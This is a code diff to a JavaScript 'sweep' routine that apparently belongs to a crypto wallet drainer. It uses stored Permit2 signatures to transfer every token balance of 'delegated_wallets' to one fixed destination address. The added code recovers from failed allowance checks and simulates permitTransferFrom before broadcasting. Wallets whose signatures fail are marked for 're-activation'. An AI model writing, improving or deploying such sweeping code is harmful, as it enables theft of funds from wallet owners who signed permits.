@@ -1692,6 +1692,7 @@ async function sweep(wallet) {
           callData:     ERC20_ALLOW_IFACE.encodeFunctionData("allowance", [checksum, PERMIT2_ADDRESS]),
         }))
       ).catch(() => null);
+
       if (allowChecks) {
         const approved = []; const skipped = [];
         for (let i = 0; i < withBalance.length; i++) {
@@ -1718,6 +1719,35 @@ async function sweep(wallet) {
         }
         if (skipped.length) log(`[gasless] ⚠️  ${skipped.length} token(s) need on-chain Permit2 approval: ${skipped.join(", ")}`);
         withBalance.splice(0, withBalance.length, ...approved);
+      } else {
+        // Multicall failed (rate-limit / RPC hiccup). Treat all withBalance tokens as
+        // having zero allowance so we don't broadcast a guaranteed-failing transaction.
+        // Fall back to individual eth_call checks to recover what we can.
+        warn(`[gasless] allowance multicall failed — falling back to per-token checks`);
+        const fbApproved = []; const fbSkipped = [];
+        const rp = getReadProvider();
+        for (const p of [...withBalance]) {
+          try {
+            const raw = await rp.call({
+              to: p.token,
+              data: ERC20_ALLOW_IFACE.encodeFunctionData("allowance", [checksum, PERMIT2_ADDRESS]),
+            });
+            let allow = 0n;
+            if (raw && raw !== "0x") { try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", raw); } catch {} }
+            if (allow > 0n) {
+              const permittedAmt = BigInt(p.amount ?? "0");
+              const allowCap     = allow < p.balance ? allow : p.balance;
+              const cappedBalance = permittedAmt > 0n && permittedAmt < allowCap ? permittedAmt : allowCap;
+              fbApproved.push({ ...p, balance: cappedBalance });
+            } else {
+              fbSkipped.push(p.token.slice(0, 10));
+            }
+          } catch {
+            fbSkipped.push(p.token.slice(0, 10));
+          }
+        }
+        if (fbSkipped.length) log(`[gasless] ⚠️  ${fbSkipped.length} token(s) need on-chain Permit2 approval (fallback): ${fbSkipped.join(", ")}`);
+        withBalance.splice(0, withBalance.length, ...fbApproved);
       }
 
       if (withBalance.length === 0) {
@@ -1730,6 +1760,82 @@ async function sweep(wallet) {
         return;
       }
       log(`[gasless] sweeping ${withBalance.length} tokens`);
+
+      // ── Pre-flight eth_call simulation ───────────────────────────────────────
+      // Simulate permitTransferFrom via eth_call BEFORE broadcasting. BSC's JSON-RPC
+      // wraps custom errors in a non-standard envelope that ethers can't decode after
+      // the fact ("could not coalesce error"). eth_call returns the raw revert data
+      // which we CAN decode, and we skip the broadcast if the call would fail.
+      const PERMIT2_ERROR_IFACE = new ethers.Interface([
+        "error InvalidNonce()",
+        "error SignatureExpired(uint256)",
+        "error InvalidSigner()",
+        "error InsufficientAllowance(uint256)",
+        "error InvalidAmount(uint256)",
+        "error LengthMismatch()",
+      ]);
+      const sweepMapPf = new Map(withBalance.map(t => [t.token.toLowerCase(), t.balance]));
+      const fullPermittedPf       = permitted.map(t => ({ token: t.token, amount: BigInt(t.amount) }));
+      const fullTransferDetailsPf = permitted.map(t => ({
+        to: DESTINATION_ADDRESS,
+        requestedAmount: sweepMapPf.get(t.token.toLowerCase()) ?? 0n,
+      }));
+      const gasLimitPf = 200_000n + BigInt(permitted.length) * 2_200n + BigInt(withBalance.length) * 80_000n;
+      try {
+        await permit2Batch.permitTransferFrom.staticCall(
+          { permitted: fullPermittedPf, nonce: BigInt(sig.nonce), deadline: dl },
+          fullTransferDetailsPf,
+          checksum,
+          stData.signature,
+          { gasLimit: gasLimitPf },
+        );
+        log(`[gasless] pre-flight ✅ — broadcasting`);
+      } catch (simErr) {
+        let revertName = simErr?.revert?.name ?? null;
+        if (!revertName) {
+          const errData = simErr?.data ?? simErr?.error?.data ?? null;
+          if (errData) { try { revertName = PERMIT2_ERROR_IFACE.parseError(errData)?.name; } catch {} }
+        }
+        const simMsg = revertName ?? simErr?.reason ?? simErr?.shortMessage ?? simErr?.message ?? "unknown";
+        err(`[gasless] pre-flight FAILED: ${simMsg}`);
+        if (revertName === "InvalidNonce") {
+          log(`[gasless] nonce already used — marking sig spent, needs re-activation`);
+          if (supabase) {
+            await supabase.from("permit2_signatures").update({ spent: true })
+              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
+            await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          }
+          return;
+        }
+        if (revertName === "InsufficientAllowance") {
+          warn(`[gasless] on-chain Permit2 allowance zero — marking needs re-activation`);
+          if (supabase) {
+            await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          }
+          return;
+        }
+        if (revertName === "InvalidSigner") {
+          err(`[gasless] ❌ INVALID SIGNER — sig was signed for a different relayer or chain`);
+          if (supabase) {
+            await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          }
+          return;
+        }
+        if (revertName === "SignatureExpired") {
+          if (supabase) {
+            await supabase.from("permit2_signatures").update({ spent: true })
+              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
+            await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          }
+          return;
+        }
+        // Unknown simulation error — still attempt broadcast; it may be a simulation artifact
+        warn(`[gasless] unknown pre-flight error (${simMsg}) — proceeding with broadcast`);
+      }
 
       try {
         const fee = await getFeeData();
